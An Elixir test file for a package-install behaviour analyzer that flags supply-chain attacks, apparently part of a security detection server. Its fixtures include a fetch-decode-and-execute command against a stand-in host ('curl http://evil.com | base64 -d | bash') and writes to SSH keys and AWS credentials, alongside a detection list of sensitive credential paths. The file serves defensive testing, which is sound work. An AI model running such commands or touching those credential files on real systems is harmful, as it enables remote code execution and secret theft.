defmodule TamanduaServer.Detection.PackageBehaviorAnalyzerTest do
  use ExUnit.Case, async: true

  alias TamanduaServer.Detection.PackageBehaviorAnalyzer

  describe "analyze_install_window/3" do
    test "detects suspicious command in child process" do
      agent_id = "test-agent"
      root_pid = 1000

      events = [
        %{
          "type" => "process_creation",
          "pid" => 1001,
          "parent_pid" => 1000,
          "command_line" => "curl http://evil.com | base64 -d | bash",
          "timestamp" => "2026-04-04T12:00:05Z"
        }
      ]

      assert {:anomalous, anomalies, risk_score} = PackageBehaviorAnalyzer.analyze_install_window(agent_id, root_pid, events)
      assert match?({:suspicious, _}, anomalies.suspicious_scripts)
      assert risk_score > 0
    end

    test "flags unexpected network destinations" do
      agent_id = "test-agent"
      root_pid = 1000

      events = [
        %{
          "type" => "network_connection",
          "source_pid" => 1001,
          "destination_hostname" => "evil-server.com",
          "destination_port" => 443,
          "timestamp" => "2026-04-04T12:00:05Z"
        }
      ]

      assert {:anomalous, anomalies, _risk_score} = PackageBehaviorAnalyzer.analyze_install_window(agent_id, root_pid, events)
      assert length(anomalies.anomalous_network) == 1
      assert hd(anomalies.anomalous_network)["destination_hostname"] == "evil-server.com"
    end

    test "flags sensitive file access" do
      agent_id = "test-agent"
      root_pid = 1000

      events = [
        %{
          "type" => "file_write",
          "pid" => 1001,
          "file_path" => "/home/user/.ssh/id_rsa",
          "bytes_written" => 2048,
          "timestamp" => "2026-04-04T12:00:05Z"
        }
      ]

      assert {:anomalous, anomalies, _risk_score} = PackageBehaviorAnalyzer.analyze_install_window(agent_id, root_pid, events)
      assert length(anomalies.sensitive_file_access) == 1
      assert hd(anomalies.sensitive_file_access)["file_path"] == "/home/user/.ssh/id_rsa"
    end

    test "returns :ok when no anomalies detected" do
      agent_id = "test-agent"
      root_pid = 1000

      events = [
        %{
          "type" => "process_creation",
          "pid" => 1001,
          "command_line" => "npm install lodash",
          "timestamp" => "2026-04-04T12:00:05Z"
        },
        %{
          "type" => "network_connection",
          "source_pid" => 1001,
          "destination_hostname" => "registry.npmjs.org",
          "destination_port" => 443,
          "timestamp" => "2026-04-04T12:00:06Z"
        }
      ]

      assert :ok = PackageBehaviorAnalyzer.analyze_install_window(agent_id, root_pid, events)
    end

    test "combines multiple anomaly types" do
      agent_id = "test-agent"
      root_pid = 1000

      events = [
        %{
          "type" => "process_creation",
          "pid" => 1001,
          "command_line" => "curl http://malicious.com/payload",
          "timestamp" => "2026-04-04T12:00:05Z"
        },
        %{
          "type" => "network_connection",
          "source_pid" => 1001,
          "destination_ip" => "185.234.219.47",
          "destination_port" => 443,
          "timestamp" => "2026-04-04T12:00:06Z"
        },
        %{
          "type" => "file_write",
          "pid" => 1001,
          "file_path" => "/home/user/.aws/credentials",
          "timestamp" => "2026-04-04T12:00:07Z"
        }
      ]

      assert {:anomalous, anomalies, risk_score} = PackageBehaviorAnalyzer.analyze_install_window(agent_id, root_pid, events)
      assert match?({:suspicious, _}, anomalies.suspicious_scripts)
      assert length(anomalies.anomalous_network) == 1
      assert length(anomalies.sensitive_file_access) == 1
      assert risk_score > 0.8
    end
  end

  describe "is_anomalous_network?/1" do
    test "returns false for npm registry" do
      event = %{"destination_hostname" => "registry.npmjs.org"}
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end

    test "returns false for pypi.org" do
      event = %{"destination_hostname" => "pypi.org"}
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end

    test "returns false for crates.io" do
      event = %{"destination_hostname" => "static.crates.io"}
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end

    test "returns false for rubygems.org" do
      event = %{"destination_hostname" => "rubygems.org"}
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end

    test "returns false for golang proxy" do
      event = %{"destination_hostname" => "proxy.golang.org"}
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end

    test "returns false for common CDNs (cloudflare, fastly)" do
      event1 = %{"destination_hostname" => "cdn.cloudflare.com"}
      event2 = %{"destination_hostname" => "fastly.net"}
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event1)
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event2)
    end

    test "returns true for unknown hostname" do
      event = %{"destination_hostname" => "evil-server.com"}
      assert PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end

    test "returns false for localhost IP" do
      event = %{"destination_ip" => "127.0.0.1"}
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end

    test "returns false for private IP 10.0.0.0/8" do
      event = %{"destination_ip" => "10.0.0.5"}
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end

    test "returns false for private IP 172.16.0.0/12" do
      event = %{"destination_ip" => "172.16.0.5"}
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end

    test "returns false for private IP 192.168.0.0/16" do
      event = %{"destination_ip" => "192.168.1.1"}
      refute PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end

    test "returns true for public IP" do
      event = %{"destination_ip" => "185.234.219.47"}
      assert PackageBehaviorAnalyzer.is_anomalous_network?(event)
    end
  end

  describe "is_sensitive_file?/1" do
    test "returns true for .ssh directory files" do
      event = %{"file_path" => "/home/user/.ssh/id_rsa"}
      assert PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns true for id_rsa key" do
      event = %{"file_path" => "C:\\Users\\dev\\.ssh\\id_rsa"}
      assert PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns true for id_ed25519 key" do
      event = %{"file_path" => "/home/user/.ssh/id_ed25519"}
      assert PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns true for AWS credentials" do
      event = %{"file_path" => "/home/user/.aws/credentials"}
      assert PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns true for .env files" do
      event = %{"file_path" => "/app/.env"}
      assert PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns true for .npmrc" do
      event = %{"file_path" => "/home/user/.npmrc"}
      assert PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns true for .pypirc" do
      event = %{"file_path" => "/home/user/.pypirc"}
      assert PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns true for secrets.json" do
      event = %{"file_path" => "/app/secrets.json"}
      assert PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns true for .gnupg directory" do
      event = %{"file_path" => "/home/user/.gnupg/private-keys"}
      assert PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns true for .kube/config" do
      event = %{"file_path" => "/home/user/.kube/config"}
      assert PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns false for regular files" do
      event = %{"file_path" => "/tmp/install.log"}
      refute PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end

    test "returns false for node_modules files" do
      event = %{"file_path" => "/app/node_modules/lodash/package.json"}
      refute PackageBehaviorAnalyzer.is_sensitive_file?(event)
    end
  end

  describe "build_supply_chain_alert/3" do
    test "creates alert with correct structure" do
      agent_id = "test-agent"
      ecosystem = :npm

      anomalies = %{
        suspicious_scripts: {:suspicious, %{
          patterns: [:network_download, :base64_decode],
          risk_score: 0.85
        }},
        anomalous_network: [
          %{"destination_hostname" => "evil.com", "destination_port" => 443}
        ],
        sensitive_file_access: [
          %{"file_path" => "/home/user/.ssh/id_rsa"}
        ]
      }

      alert = PackageBehaviorAnalyzer.build_supply_chain_alert(agent_id, ecosystem, anomalies)

      assert alert.type == "supply_chain"
      assert alert.severity in ["critical", "high", "medium", "low"]
      assert alert.title == "Suspicious package install behavior detected"
      assert is_binary(alert.description)
      assert alert.enrichment["ecosystem"] == "npm"
      assert is_list(alert.enrichment["suspicious_patterns"])
      assert is_list(alert.enrichment["network_destinations"])
      assert is_list(alert.enrichment["sensitive_files"])
      assert "T1195.001" in alert.mitre_techniques
      assert "T1059" in alert.mitre_techniques
      assert "initial_access" in alert.mitre_tactics
      assert "execution" in alert.mitre_tactics
    end

    test "assigns critical severity for high-risk score" do
      anomalies = %{
        suspicious_scripts: {:suspicious, %{risk_score: 0.95}},
        anomalous_network: [],
        sensitive_file_access: []
      }

      alert = PackageBehaviorAnalyzer.build_supply_chain_alert("agent", :npm, anomalies)
      assert alert.severity == "critical"
    end

    test "assigns high severity for medium-risk score" do
      anomalies = %{
        suspicious_scripts: {:suspicious, %{risk_score: 0.75}},
        anomalous_network: [],
        sensitive_file_access: []
      }

      alert = PackageBehaviorAnalyzer.build_supply_chain_alert("agent", :pip, anomalies)
      assert alert.severity == "high"
    end

    test "assigns medium severity for low-risk score" do
      anomalies = %{
        suspicious_scripts: {:suspicious, %{risk_score: 0.55}},
        anomalous_network: [],
        sensitive_file_access: []
      }

      alert = PackageBehaviorAnalyzer.build_supply_chain_alert("agent", :cargo, anomalies)
      assert alert.severity == "medium"
    end
  end
end
